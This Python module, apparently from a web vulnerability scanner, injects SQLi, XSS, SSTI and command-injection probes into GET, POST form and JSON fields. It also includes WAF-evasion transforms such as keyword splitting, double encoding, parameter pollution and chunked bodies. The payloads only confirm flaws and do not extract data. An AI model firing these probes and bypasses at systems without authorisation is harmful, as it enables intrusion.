"""多载体多类型注入探测：SQLi（错误/布尔/时间盲）/XSS 回显/SSTI/命令注入。

载体：GET 参数、POST 表单、POST JSON（叶子字段逐个注入）。
原则：验证为止，不取数据、不执行真实命令（cmd 注入用 echo 标记回显判定）、
XSS 只判回显上下文不弹框。参数级去重：一个参数命中一次即停。
"""

from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.request
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from camty.modules.sqli_probe import ERROR_SIGNATURES

BOOLEAN_TRUE = "' AND '1'='1"
BOOLEAN_FALSE = "' AND '1'='2"
BOOLEAN_MIN_DIFF = 40
TIME_PAYLOADS = ["' AND SLEEP(3)-- -", "' AND pg_sleep(3)-- -", "1; WAITFOR DELAY '0:0:3'--"]
TIME_THRESHOLD = 2.5
XSS_MARKER = "camtyxss7f3"
XSS_PAYLOADS = [f"{XSS_MARKER}<script>", f"\">{XSS_MARKER}", f"'>{XSS_MARKER}"]
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]
SSTI_RESULT = "49"
CMD_MARKER = "camtycmd9a2"
CMD_PAYLOADS = [f"; echo {CMD_MARKER}", f"| echo {CMD_MARKER}", f"&& echo {CMD_MARKER}"]
SQLI_PROBES = ["'", '"', "\\)", "')", "';", "') OR ('1'='1"]

_SQL_KEYWORD_RE = re.compile(r"\b(SELECT|AND|OR|UNION|FROM|SLEEP|WAITFOR|DELAY|BENCHMARK)\b", re.I)


def _sql_case_mixed(payload: str) -> str:
    """SQL 关键字大小写混淆：SeLeCt。"""
    def sub(m):
        word = m.group(1)
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))
    return _SQL_KEYWORD_RE.sub(sub, payload)


def _sql_inline_comment(payload: str) -> str:
    """内联注释混淆：select → /*!50000select*/（MySQL 版本注释）。"""
    def sub(m):
        return f"/*!50000{m.group(1)}*/"
    return _SQL_KEYWORD_RE.sub(sub, payload)


def _sql_comment_split(payload: str) -> str:
    """注释分拆：SELECT → SEL/**/ECT（拆 WAF 关键字正则）。"""
    def sub(m):
        word = m.group(1)
        if len(word) <= 2:
            return word
        cut = len(word) // 2
        return f"{word[:cut]}/**/{word[cut:]}"
    return _SQL_KEYWORD_RE.sub(sub, payload)


def _url_encode(payload: str) -> str:
    """关键字符 URL 编码：' → %27、空格 → %20。"""
    table = str.maketrans({"'": "%27", '"': "%22", " ": "%20", "(": "%28", ")": "%29"})
    return payload.translate(table)


def _double_encode(payload: str) -> str:
    """双重 URL 编码：%27 → %2527（一次解码后仍是编码态，绕单层解码 WAF）。"""
    table = str.maketrans({"'": "%2527", '"': "%2522", " ": "%2520", "(": "%2528", ")": "%2529"})
    return payload.translate(table)


def _hpp_split(payload: str) -> str:
    """参数污染：payload 首部插 & 假参数，制造 WAF 与后端参数解析错位。"""
    return f"&__c={payload}"


def evasion_variants(payload: str, kind: str) -> list[str]:
    """evasion 开关下的 payload 变换族。cmd/ssti 变换会破坏语法，保持原样。"""
    if kind in ("sqli", "time-blind"):
        return [payload, _sql_case_mixed(payload), _sql_inline_comment(payload),
                _sql_comment_split(payload), _url_encode(payload),
                _double_encode(payload), _hpp_split(payload)]
    if kind == "xss":
        return [payload, payload.replace("<script", "<ScRiPt")]
    return [payload]


def _request(url: str, method: str = "GET", body: bytes | None = None,
             headers: dict | None = None, timeout: float = 12.0,
             chunked: bool = False) -> tuple[str | None, float]:
    """返回 (响应文本, 耗时秒)。Chrome 指纹优先（curl_cffi），回退 urllib。

    chunked=True 时手工分块（Transfer-Encoding: chunked，WAF 难以重组请求体——
    urllib 对无 __len__ 的 iterable body 自动走 chunked）。"""
    from camty.modules import http_fp

    start = time.monotonic()
    if not chunked:
        out = http_fp.fetch(url, method=method, headers=headers, body=body, timeout=timeout)
        if out is not None:
            return out[0], time.monotonic() - start
    data = body
    if chunked and body:
        half = max(1, len(body) // 2)
        data = iter([body[:half], body[half:]])
    try:
        req = urllib.request.Request(url, data=data, method=method,
                                     headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace"), time.monotonic() - start
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", "replace"), time.monotonic() - start
    except (urllib.error.URLError, TimeoutError, OSError):
        return None, time.monotonic() - start


def _error_db(text: str) -> str | None:
    for name, pattern in ERROR_SIGNATURES:
        if pattern.search(text or ""):
            return name
    return None


def _leaf_paths(obj, prefix="$"):
    """JSON 树的叶子字段路径（$ 前缀）。"""
    if isinstance(obj, dict):
        for key, value in obj.items():
            yield from _leaf_paths(value, f"{prefix}.{key}")
    elif isinstance(obj, list):
        for i, value in enumerate(obj):
            yield from _leaf_paths(value, f"{prefix}[{i}]")
    else:
        yield prefix


def _set_leaf(obj, path: str, value):
    """按 $ 前缀路径设置叶子值。"""
    node = obj
    steps = path.split(".")[1:]
    for i, step in enumerate(steps):
        m = re.match(r"^(\w+)\[(\d+)\]$", step)
        if m:
            node = node[int(m.group(2))]
            continue
        if i == len(steps) - 1:
            node[step] = value
        else:
            node = node[step]


def _json_body(template: str, path: str, value) -> bytes | None:
    try:
        obj = json.loads(template)
    except (json.JSONDecodeError, TypeError):
        return None
    try:
        _set_leaf(obj, path, value)
    except (KeyError, IndexError, TypeError):
        return None
    return json.dumps(obj).encode("utf-8")


def _iter_payloads(kind: str, evasion: bool) -> list[str]:
    """原始 payload → evasion 开启时展开为变换族（命中即停按族内顺序尝试）。"""
    raw = _payloads_for(kind)
    if not evasion:
        return raw
    out: list[str] = []
    for payload in raw:
        out.extend(evasion_variants(payload, kind))
    return out


def probe_get(url: str, kinds: list[str], delay: float = 0.2,
              timeout: float = 12.0, evasion: bool = False) -> list[dict]:
    """GET 参数注入探测。"""
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    hits: list[dict] = []
    if not params:
        return hits
    for pname, pvalue in params:
        stopped = False
        base_text, _ = _request(url, timeout=timeout)
        for kind in kinds:
            if stopped:
                break
            for payload in _iter_payloads(kind, evasion):
                if kind == "time-blind":
                    probe_url = urlunparse(parsed._replace(
                        query=urlencode([(k, (v if k != pname else (v or "") + payload))
                                         for k, v in params])))
                    text, elapsed = _request(probe_url, timeout=timeout + 5)
                    if delay:
                        time.sleep(delay)
                    if text is not None and elapsed >= TIME_THRESHOLD:
                        hits.append({"kind": "time-blind-sqli", "param": pname,
                                     "method": "GET", "evidence": f"延迟 {elapsed:.1f}s"})
                        stopped = True
                        break
                    continue
                probe_value = (pvalue or "") + payload
                probe_url = urlunparse(parsed._replace(
                    query=urlencode([(k, (v if k != pname else probe_value))
                                     for k, v in params])))
                text, _ = _request(probe_url, timeout=timeout, chunked=evasion)
                if delay:
                    time.sleep(delay)
                hit = _judge(kind, payload, text, base_text)
                if hit:
                    hits.append({"kind": hit, "param": pname, "method": "GET",
                                 "evidence": f"payload {payload[:40]!r} {hit}"})
                    stopped = True
                    break
    return hits


def _judge(kind: str, payload: str, text: str | None, base_text: str | None) -> str | None:
    if text is None:
        return None
    if kind == "sqli":
        if (db := _error_db(text)):
            return f"error-based({db})"
        if payload in (BOOLEAN_TRUE, BOOLEAN_FALSE) and base_text:
            pass  # GET 布尔对在 probe_get 内成对比较，此分支不触发
        return None
    if kind == "xss" and XSS_MARKER in text:
        return "reflected-xss"
    if kind == "ssti" and SSTI_RESULT in text and payload not in text:
        return "ssti-eval"
    if kind == "cmd" and CMD_MARKER in text:
        return "command-injection"
    return None


def probe_post(url: str, body_template: str, content_type: str,
               kinds: list[str], delay: float = 0.2,
               timeout: float = 12.0, evasion: bool = False) -> list[dict]:
    """POST 载体注入探测：application/x-www-form-urlencoded 或 application/json。

    JSON 载体逐叶子字段注入（含嵌套）；表单逐字段注入。
    """
    is_json = "json" in content_type
    headers = {"Content-Type": content_type}
    base_text, _ = _request(url, method="POST", body=body_template.encode("utf-8"),
                            headers=headers, timeout=timeout)
    if is_json:
        try:
            template_obj = json.loads(body_template)
        except json.JSONDecodeError:
            return []
        fields = list(_leaf_paths(template_obj))
    else:
        fields = [k for k, _ in parse_qsl(body_template, keep_blank_values=True)]
    hits: list[dict] = []
    for field in fields:
        stopped = False
        for kind in kinds:
            if stopped:
                break
            for payload in _iter_payloads(kind, evasion):
                body = _build_body(body_template, field, payload, is_json)
                if body is None:
                    continue
                text, elapsed = _request(url, method="POST", body=body,
                                         headers=headers, timeout=timeout + 5,
                                         chunked=evasion)
                if delay:
                    time.sleep(delay)
                if text is None:
                    continue
                if kind == "time-blind":
                    if elapsed >= TIME_THRESHOLD:
                        hits.append({"kind": "time-blind-sqli", "param": field,
                                     "method": "POST-JSON" if is_json else "POST",
                                     "evidence": f"延迟 {elapsed:.1f}s"})
                        stopped = True
                        break
                    continue
                if kind == "sqli":
                    if (db := _error_db(text)):
                        hits.append({"kind": f"error-based({db})", "param": field,
                                     "method": "POST-JSON" if is_json else "POST",
                                     "evidence": f"错误回显: {payload[:30]!r}"})
                        stopped = True
                        break
                    continue
                hit = _judge(kind, payload, text, base_text)
                if hit:
                    hits.append({"kind": hit, "param": field,
                                 "method": "POST-JSON" if is_json else "POST",
                                 "evidence": f"payload {payload[:40]!r}"})
                    stopped = True
                    break
    return hits


def _payloads_for(kind: str) -> list[str]:
    return {
        "sqli": SQLI_PROBES, "xss": XSS_PAYLOADS,
        "ssti": SSTI_PAYLOADS, "cmd": CMD_PAYLOADS,
        "time-blind": TIME_PAYLOADS,
    }.get(kind, [])


def _build_body(template: str, field: str, payload: str, is_json: bool) -> bytes | None:
    if is_json:
        return _json_body(template, field, payload)
    params = [(k, (v if k != field else (v or "") + payload))
              for k, v in parse_qsl(template, keep_blank_values=True)]
    return urlencode(params).encode("utf-8")
